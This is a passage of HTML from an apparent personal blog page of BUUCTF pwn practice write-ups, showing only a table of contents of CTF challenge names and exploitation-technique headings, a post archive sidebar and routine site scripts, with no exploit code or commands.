class="toc-number">11.5.1.</span> <span class="toc-text">starctf2018_babystack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bctf-2018-bugstore"><span class="toc-number">11.5.2.</span> <span class="toc-text">bctf_2018_bugstore</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#picoctf-2018-buffer-overflow-3"><span class="toc-number">11.5.3.</span> <span class="toc-text">picoctf_2018_buffer overflow 3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fini-array"><span class="toc-number">11.6.</span> <span class="toc-text">fini_array</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-317"><span class="toc-number">11.6.1.</span> <span class="toc-text">pwnable_317</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-sw-1"><span class="toc-number">11.6.2.</span> <span class="toc-text">ciscn_2019_sw_1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP"><span class="toc-number">11.7.</span> <span class="toc-text">ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#asis-finals-2019-rop13"><span class="toc-number">11.7.1.</span> <span class="toc-text">asis_finals_2019_rop13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#microwave-ins-2016"><span class="toc-number">11.7.2.</span> <span class="toc-text">microwave_ins_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#seccon2022-koncha"><span class="toc-number">11.7.3.</span> <span class="toc-text">seccon2022-koncha</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wdb-2018-final-pwn3"><span class="toc-number">11.7.4.</span> <span class="toc-text">wdb_2018_final_pwn3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-silverbullet"><span class="toc-number">11.7.5.</span> <span class="toc-text">pwnable_silverbullet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xm-2019-awd-pwn1"><span class="toc-number">11.7.6.</span> <span class="toc-text">xm_2019_awd_pwn1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#roarctf-2019-easyrop"><span class="toc-number">11.7.7.</span> <span class="toc-text">roarctf_2019_easyrop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-ne-3"><span class="toc-number">11.7.8.</span> <span class="toc-text">ciscn_2019_ne_3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xp0intctf-2018-gameserver"><span class="toc-number">11.7.9.</span> <span class="toc-text">xp0intctf_2018_gameserver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#inndy-very-overflow"><span class="toc-number">11.7.10.</span> <span class="toc-text">inndy_very_overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#inndy-homework"><span class="toc-number">11.7.11.</span> <span class="toc-text">inndy_homework</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#inndy-stack"><span class="toc-number">11.7.12.</span> <span class="toc-text">inndy_stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cscctf-2019-qual-babystack"><span class="toc-number">11.7.13.</span> <span class="toc-text">cscctf_2019_qual_babystack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81-STKOF"><span class="toc-number">11.7.14.</span> <span class="toc-text">强网杯2019 拟态 STKOF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">11.8.</span> <span class="toc-text">ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-seven"><span class="toc-number">11.8.1.</span> <span class="toc-text">铁人三项(第五赛区)_2018_seven</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-echo1"><span class="toc-number">11.8.2.</span> <span class="toc-text">pwnable_echo1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xman-2019-nooocall"><span class="toc-number">11.8.3.</span> <span class="toc-text">xman_2019_nooocall</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tiny-backdoor-v1-hackover-2016"><span class="toc-number">11.8.4.</span> <span class="toc-text">tiny_backdoor_v1_hackover_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#inndy-onepunch"><span class="toc-number">11.8.5.</span> <span class="toc-text">inndy_onepunch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#inndy-leave-msg"><span class="toc-number">11.8.6.</span> <span class="toc-text">inndy_leave_msg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#csaw2018-shell-code"><span class="toc-number">11.8.7.</span> <span class="toc-text">csaw2018_shell_code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rctf-2019-shellcoder"><span class="toc-number">11.8.8.</span> <span class="toc-text">rctf_2019_shellcoder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xp0intctf-2018-bof"><span class="toc-number">11.8.9.</span> <span class="toc-text">xp0intctf_2018_bof</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%A9%E7%9F%ADshellcode"><span class="toc-number">11.8.9.1.</span> <span class="toc-text">缩短shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#syscall%E9%87%8C%E9%9D%A2rax%E8%B5%8B%E5%80%BC"><span class="toc-number">11.8.9.2.</span> <span class="toc-text">syscall里面rax赋值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xor"><span class="toc-number">11.8.9.3.</span> <span class="toc-text">xor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mov-rdi-rsp"><span class="toc-number">11.8.9.4.</span> <span class="toc-text">mov rdi,rsp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#execve-bin-sh-%E6%9C%80%E7%9F%AD%E7%9A%84shellcode"><span class="toc-number">11.8.9.5.</span> <span class="toc-text">execve(&#x2F;bin&#x2F;sh)最短的shellcode</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#starctf-2019-babyshell"><span class="toc-number">11.8.10.</span> <span class="toc-text">starctf_2019_babyshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lctf2016-pwn200"><span class="toc-number">11.8.11.</span> <span class="toc-text">lctf2016_pwn200</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">12.</span> <span class="toc-text">格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#bss%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">12.1.</span> <span class="toc-text">bss上格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-nw-6"><span class="toc-number">12.1.1.</span> <span class="toc-text">ciscn_2019_nw_6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#printf%E8%A7%A6%E5%8F%91malloc"><span class="toc-number">12.2.</span> <span class="toc-text">printf触发malloc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cscctf-2019-final-babyprintf"><span class="toc-number">12.2.1.</span> <span class="toc-text">cscctf_2019_final_babyprintf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0ctf2017-easiestprintf"><span class="toc-number">12.2.2.</span> <span class="toc-text">0ctf2017_easiestprintf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">12.3.</span> <span class="toc-text">栈上的格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#watevr-2019-voting-machine-2"><span class="toc-number">12.3.1.</span> <span class="toc-text">watevr_2019_voting_machine_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wustctf2020-babyfmt"><span class="toc-number">12.3.2.</span> <span class="toc-text">wustctf2020_babyfmt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bbctf-2020-fmt-me"><span class="toc-number">12.3.3.</span> <span class="toc-text">bbctf_2020_fmt_me</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99"><span class="toc-number">12.3.3.1.</span> <span class="toc-text">报错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#snprintf"><span class="toc-number">12.3.3.2.</span> <span class="toc-text">snprintf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-p"><span class="toc-number">12.3.3.3.</span> <span class="toc-text">%1$p</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-p"><span class="toc-number">12.3.3.4.</span> <span class="toc-text">%2$p</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-p"><span class="toc-number">12.3.3.5.</span> <span class="toc-text">%3$p</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-p"><span class="toc-number">12.3.3.6.</span> <span class="toc-text">%4$p</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-p"><span class="toc-number">12.3.3.7.</span> <span class="toc-text">%5$p</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#got-plt%E8%A1%A8%E5%8E%9F%E7%90%86"><span class="toc-number">12.3.3.8.</span> <span class="toc-text">got,plt表原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="toc-number">12.3.3.9.</span> <span class="toc-text">测试代码</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86"><span class="toc-number">13.</span> <span class="toc-text">堆</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#off-by-null"><span class="toc-number">13.1.</span> <span class="toc-text">off by null</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#asis2016-b00ks"><span class="toc-number">13.1.1.</span> <span class="toc-text">asis2016_b00ks</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%99%E7%9B%92"><span class="toc-number">13.2.</span> <span class="toc-text">沙盒</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ycb-2020-easy-heap"><span class="toc-number">13.2.1.</span> <span class="toc-text">ycb_2020_easy_heap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E6%BA%A2%E5%87%BA"><span class="toc-number">13.3.</span> <span class="toc-text">堆溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#others-pwn1"><span class="toc-number">13.3.1.</span> <span class="toc-text">others_pwn1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#realloc"><span class="toc-number">13.4.</span> <span class="toc-text">realloc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#roarctf-2019-realloc-magic"><span class="toc-number">13.4.1.</span> <span class="toc-text">roarctf_2019_realloc_magic</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-force"><span class="toc-number">13.5.</span> <span class="toc-text">house of force</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bcloud-bctf-2016"><span class="toc-number">13.5.1.</span> <span class="toc-text">bcloud_bctf_2016</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-orange"><span class="toc-number">13.6.</span> <span class="toc-text">house of orange</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#houseoforange-hitcon-2016"><span class="toc-number">13.6.1.</span> <span class="toc-text">houseoforange_hitcon_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%86%E6%9E%90"><span class="toc-number">13.6.1.1.</span> <span class="toc-text">漏洞点分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%89%8D%E6%8F%90"><span class="toc-number">13.6.1.2.</span> <span class="toc-text">攻击前提</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">13.6.1.3.</span> <span class="toc-text">调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc%E5%92%8C%E5%A0%86%E5%9C%B0%E5%9D%80"><span class="toc-number">13.6.1.4.</span> <span class="toc-text">泄露libc和堆地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BBmalloc-printrr"><span class="toc-number">13.6.1.5.</span> <span class="toc-text">攻击malloc_printrr</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%8Ammap%E5%87%BA%E6%9D%A5%E7%9A%84%E5%9D%97%E7%94%A8top-chunk%E5%88%86%E9%85%8D"><span class="toc-number">13.7.</span> <span class="toc-text">把mmap出来的块用top chunk分配</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#secretHolder-hitcon-2016"><span class="toc-number">13.7.1.</span> <span class="toc-text">secretHolder_hitcon_2016</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#top-chunk%E4%B8%8A%E7%A7%BB"><span class="toc-number">13.8.</span> <span class="toc-text">top chunk上移</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#actf-2019-actfnote"><span class="toc-number">13.8.1.</span> <span class="toc-text">actf_2019_actfnote</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unsorted-bin-attack"><span class="toc-number">13.9.</span> <span class="toc-text">unsorted bin attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cscctf-2019-final-childrenheap"><span class="toc-number">13.9.1.</span> <span class="toc-text">cscctf_2019_final_childrenheap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rctf-2019-babyheap"><span class="toc-number">13.9.2.</span> <span class="toc-text">rctf_2019_babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#init"><span class="toc-number">13.9.2.1.</span> <span class="toc-text">init</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#add"><span class="toc-number">13.9.2.2.</span> <span class="toc-text">add</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#free"><span class="toc-number">13.9.2.3.</span> <span class="toc-text">free</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#show"><span class="toc-number">13.9.2.4.</span> <span class="toc-text">show</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#edit"><span class="toc-number">13.9.2.5.</span> <span class="toc-text">edit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">13.9.2.6.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB"><span class="toc-number">13.9.2.7.</span> <span class="toc-text">攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-number">13.9.2.8.</span> <span class="toc-text">泄露libc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#chunk%E4%BC%AA%E9%80%A0"><span class="toc-number">13.9.2.9.</span> <span class="toc-text">chunk伪造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%88%E5%B9%B6"><span class="toc-number">13.9.2.10.</span> <span class="toc-text">合并</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc-1"><span class="toc-number">13.9.2.11.</span> <span class="toc-text">泄露libc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%8D%E4%B8%80%E6%AC%A1%E5%A0%86%E5%9D%97%E9%87%8D%E5%8F%A0"><span class="toc-number">13.9.2.12.</span> <span class="toc-text">再一次堆块重叠</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%B6%E5%9B%9E%E5%90%8E%E7%BB%AD%E7%9A%84%E5%86%85%E5%AD%98"><span class="toc-number">13.9.2.13.</span> <span class="toc-text">收回后续的内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E5%8F%A0"><span class="toc-number">13.9.2.14.</span> <span class="toc-text">重叠</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unsorted-bin-attack-1"><span class="toc-number">13.9.2.15.</span> <span class="toc-text">unsorted bin attack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9unsorted-bin%E7%9A%84bk%E4%B8%BA%E6%8C%87%E5%AE%9A%E5%9C%B0%E5%9D%80"><span class="toc-number">13.9.2.16.</span> <span class="toc-text">修改unsorted bin的bk为指定地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unsorted-bin-attack-2"><span class="toc-number">13.9.2.17.</span> <span class="toc-text">unsorted bin attack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%9F%E8%B8%AA%E6%BA%90%E7%A0%81"><span class="toc-number">13.9.2.18.</span> <span class="toc-text">跟踪源码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#int-malloc"><span class="toc-number">13.9.2.19.</span> <span class="toc-text">_int_malloc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%93%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E5%88%86%E9%85%8D%E7%9A%84size%E5%B0%8F%E4%BA%8Eunsorted-bin%E5%A4%A7%E5%B0%8F"><span class="toc-number">13.9.2.20.</span> <span class="toc-text">当我们需要分配的size小于unsorted bin大小</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%81%A2%E5%A4%8Dunsorted-bin"><span class="toc-number">13.9.2.21.</span> <span class="toc-text">恢复unsorted bin</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uaf"><span class="toc-number">13.10.</span> <span class="toc-text">uaf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jmper-seccon-2016"><span class="toc-number">13.10.1.</span> <span class="toc-text">jmper_seccon_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wdb-2018-2nd-Fgo"><span class="toc-number">13.10.2.</span> <span class="toc-text">wdb_2018_2nd_Fgo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-echo2"><span class="toc-number">13.10.3.</span> <span class="toc-text">pwnable_echo2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#isitdtu2019-iz-heap-lv1"><span class="toc-number">13.10.4.</span> <span class="toc-text">isitdtu2019_iz_heap_lv1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gyctf-2020-document"><span class="toc-number">13.10.5.</span> <span class="toc-text">gyctf_2020_document</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#double-free"><span class="toc-number">13.11.</span> <span class="toc-text">double free</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#actf-2020-scp-foundation-secret"><span class="toc-number">13.11.1.</span> <span class="toc-text">actf_2020_scp_foundation_secret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HarekazeCTF2019-Harekaze-Note"><span class="toc-number">13.11.2.</span> <span class="toc-text">[HarekazeCTF2019]Harekaze Note</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rctf2018-rnote3"><span class="toc-number">13.11.3.</span> <span class="toc-text">rctf2018_rnote3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qwb2018-slient2"><span class="toc-number">13.11.4.</span> <span class="toc-text">qwb2018_slient2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-nw-4"><span class="toc-number">13.11.5.</span> <span class="toc-text">ciscn_2019_nw_4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-s-2"><span class="toc-number">13.11.6.</span> <span class="toc-text">ciscn_2019_s_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hitb2018-gundam"><span class="toc-number">13.11.7.</span> <span class="toc-text">hitb2018_gundam</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-final-2"><span class="toc-number">13.11.8.</span> <span class="toc-text">ciscn_2019_final_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#starctf2019-girlfriend"><span class="toc-number">13.11.9.</span> <span class="toc-text">starctf2019_girlfriend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#huxiangbei-2019-namesystem"><span class="toc-number">13.11.10.</span> <span class="toc-text">huxiangbei_2019_namesystem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rootersctf-2019-heaaaappppp"><span class="toc-number">13.11.11.</span> <span class="toc-text">rootersctf_2019_heaaaappppp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ycb-2020-easypwn"><span class="toc-number">13.11.12.</span> <span class="toc-text">ycb_2020_easypwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gyctf-2020-some-thing-interesting"><span class="toc-number">13.11.13.</span> <span class="toc-text">gyctf_2020_some_thing_interesting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-en-3"><span class="toc-number">13.11.14.</span> <span class="toc-text">ciscn_2019_en_3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#calloc"><span class="toc-number">13.12.</span> <span class="toc-text">calloc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rctf2018-babyheap"><span class="toc-number">13.12.1.</span> <span class="toc-text">rctf2018_babyheap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gyctf-2020-signin"><span class="toc-number">13.12.2.</span> <span class="toc-text">gyctf_2020_signin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unlink"><span class="toc-number">13.13.</span> <span class="toc-text">unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sctf-2019-easy-heap"><span class="toc-number">13.13.1.</span> <span class="toc-text">sctf_2019_easy_heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-unlink"><span class="toc-number">13.13.2.</span> <span class="toc-text">pwnable_unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#t3sec2018-hero"><span class="toc-number">13.13.3.</span> <span class="toc-text">t3sec2018_hero</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sctf2019-easy-heap"><span class="toc-number">13.13.4.</span> <span class="toc-text">sctf2019_easy_heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gwctf-2019-chunk"><span class="toc-number">13.13.5.</span> <span class="toc-text">gwctf_2019_chunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-level6"><span class="toc-number">13.13.6.</span> <span class="toc-text">jarvisoj_level6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jarvisoj-guestbook2"><span class="toc-number">13.13.7.</span> <span class="toc-text">jarvisoj_guestbook2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zctf-2016-note3"><span class="toc-number">13.13.8.</span> <span class="toc-text">zctf_2016_note3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zctf2016-note2"><span class="toc-number">13.13.9.</span> <span class="toc-text">zctf2016_note2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-secret-of-my-heart"><span class="toc-number">13.13.10.</span> <span class="toc-text">pwnable_secret_of_my_heart</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qctf-2018-babyheap"><span class="toc-number">13.13.11.</span> <span class="toc-text">qctf_2018_babyheap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cscctf-2019-qual-babyheap"><span class="toc-number">13.13.12.</span> <span class="toc-text">cscctf_2019_qual_babyheap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sitdtu2019-iz-heap-lv2"><span class="toc-number">13.13.13.</span> <span class="toc-text">sitdtu2019_iz_heap_lv2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#suctf2018-heap"><span class="toc-number">13.13.14.</span> <span class="toc-text">suctf2018_heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qctf-2018-noleak"><span class="toc-number">13.13.15.</span> <span class="toc-text">qctf_2018_noleak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hitcon-2018-children-tcache"><span class="toc-number">13.13.16.</span> <span class="toc-text">hitcon_2018_children_tcache</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#old-edition"><span class="toc-number">14.</span> <span class="toc-text">old edition</span></a></li></ol>
            </div>
        
        <!-- sidebar -->
        <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
        <div class="sidebar-panel-archives">
    <!-- 在 ejs 中将 archive 按照时间排序 -->
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 5
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
        
            
            
            <div class="archive-year"> 2023 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/15</span>
            <a class="archive-post-title" href="/2023/11/15/java%E5%88%9B%E9%80%A0%E5%AF%B9%E8%B1%A1/">java创造对象</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/14</span>
            <a class="archive-post-title" href="/2023/11/14/k8s/">k8s攻防</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/13</span>
            <a class="archive-post-title" href="/2023/11/13/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">容器逃逸 All in One</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/12</span>
            <a class="archive-post-title" href="/2023/11/12/BUUCTF%E5%88%B7%E9%A2%98/">BUUCTF pwn刷题记录</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/11</span>
            <a class="archive-post-title" href="/index.html">Welcome</a>
        </li>
    
    </div>
</div>

        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
        
            <span class="sidebar-tag-name" data-tags="云安全">
                <span class="iconfont-archer">&#xe606;</span>
                云安全
            </span>
        
            <span class="sidebar-tag-name" data-tags="pwn">
                <span class="iconfont-archer">&#xe606;</span>
                pwn
            </span>
        
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
    </div> 
    <div class="sidebar-tags-list"></div>
</div>

        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>

    </div>
</div>

        <!-- site-meta -->
        <script>
    var siteMetaRoot = "/"
    if (siteMetaRoot === "undefined") {
        siteMetaRoot = '/'
    }
    var siteMeta = {
        url: "https://azraelxuemo.github.io",
        root: siteMetaRoot,
        author: "azraelxuemo"
    }
</script>

        <!-- import experimental options here -->
        <!-- Custom Font -->


        <!-- main func -->
        <script src="/scripts/main.js?v=20211217"></script>
        <!-- dark mode -->
        <script src="/scripts/dark.js?v=20211217"></script>
        <!-- fancybox -->
        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
        <!-- algolia -->
        
        <!-- busuanzi -->
        
            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
        
        <!-- CNZZ -->
        
        <!-- async load share.js -->
        
            <script src="/scripts/share.js?v=20211217" async></script>
        
        <!-- mermaid -->
        
    </body>
</html>
